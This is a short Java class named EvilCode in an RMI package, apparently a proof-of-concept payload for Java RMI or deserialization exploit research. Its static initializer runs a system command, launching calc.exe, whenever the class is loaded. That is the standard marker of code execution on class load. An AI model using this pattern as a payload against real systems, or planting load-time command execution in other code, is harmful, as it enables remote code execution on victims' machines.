package me.xingez.rmi;

import java.io.IOException;

public class EvilCode {
    static {
        try {
            Runtime.getRuntime().exec("calc.exe");
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}
